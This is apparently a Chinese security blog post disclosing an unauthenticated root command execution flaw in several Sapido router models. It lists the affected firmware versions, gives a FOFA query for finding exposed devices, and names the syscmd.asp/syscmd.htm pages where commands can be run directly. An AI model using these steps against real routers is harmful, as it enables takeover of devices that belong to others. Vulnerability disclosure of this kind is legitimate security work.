#  Sapido-多款路由器-远程命令执行漏洞   
原创 骇客安全  骇客安全   2025-03-29 12:48  
  
# 漏洞描述  
  
Sapido多款路由器在未授权的情况下，导致任意访问者可以以Root权限执行命令  
  
## 漏洞影响  
```
BR270n-v2.1.03
BRC76n-v2.1.03
GR297-v2.1.3
RB1732-v2.0.43
```  
  
## FOFA  
```
app="Sapido-路由器"
```  
  
## 漏洞复现  
  
固件中存在一个asp文件为 **syscmd.asp**  
 存在命令执行  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/IePibcXn991MFvUUVteatic6AibJ35SmzZ8bvToKHKdxZgiciaHJVej23kBwl55msv0275As3j4Kl2WALrVibuDjib4WQ/640?wx_fmt=png&from=appmsg "null")  
  
  
访问目标：  
  
```
http://xxx.xxx.xxx.xxx/syscmd.asp
http://xxx.xxx.xxx.xxx/syscmd.htm
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/IePibcXn991MFvUUVteatic6AibJ35SmzZ89phKY9TziaSR9uXIsKIhuibibicTIicdD3CV00TKTreu3W7EpoG27LPe1JQ/640?wx_fmt=png&from=appmsg "null")  
  
  
直接输入就可以命令执行了  
  
  
  
